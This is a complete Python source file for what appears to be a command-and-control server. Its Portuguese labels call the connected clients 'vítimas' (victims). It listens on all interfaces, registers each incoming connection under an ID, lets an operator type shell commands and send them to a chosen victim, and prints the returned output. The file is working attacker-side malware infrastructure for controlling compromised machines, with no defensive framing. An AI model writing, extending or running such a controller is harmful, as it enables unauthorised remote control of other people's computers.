import selectors
import socket
import threading
import time


HOST = '0.0.0.0'  # Symbolic name meaning all available interfaces
PORT = 50007  # Arbitrary non-privileged port

commando = ""
sel = selectors.DefaultSelector()
vitimas = {}
def accept(sock, mask):
    conn, addr = sock.accept()  # Should be ready
    print('Conectado por ', addr)
    conn.setblocking(False)
    sel.register(conn, selectors.EVENT_READ, read)
    print('ID da vítima: ', addr[1])
    vitimas[addr[1]] = conn


def read(conn, mask):
    try:
        data = conn.recv(1000)  # Should be ready
        if data:
            #port = conn.getpeername()[1]
            for key, viti in vitimas.items():
                if conn == viti:
                    print('Id da vítima: ',key)
            print('Recebendo de: ',conn.getpeername())
            print('A saída: ', str(data.decode('cp1252')))
        else:
            sel.unregister(conn)
            conn.close()
    except:
        keyf = 0
        for key, viti in vitimas.items():
            if conn == viti:
                print('Vítima de Id: ', key,' se desconectou.')
                keyf= key
        vitimas.pop(keyf, None)

        sel.unregister(conn)
        conn.close()

def listenCommand():
    while True:
        global commando;
        commando = input("\nDigite a qualquer momento o novo comando:\n")
        print('Novo comando é: ',commando)
        print('Vitimas disponiveis:')
        for vit in vitimas.keys():
            print(vit)
        key = input("Digite a key selecionada:\n")
        vitima = vitimas.get(int(key))
        print('Vítima selecionada: ',vitima.getpeername())
        vitima.send(commando.encode('utf-8'))

def ServerJobs():
    sock = socket.socket()
    sock.bind((HOST, PORT))
    sock.listen(100)
    sock.setblocking(False)
    sel.register(sock, selectors.EVENT_READ, accept)

    while True:
        events = sel.select()
        for key, mask in events:
            callback = key.data
            callback(key.fileobj, mask)

lc = threading.Thread(target=listenCommand)
sj = threading.Thread(target=ServerJobs)

lc.start()
sj.start()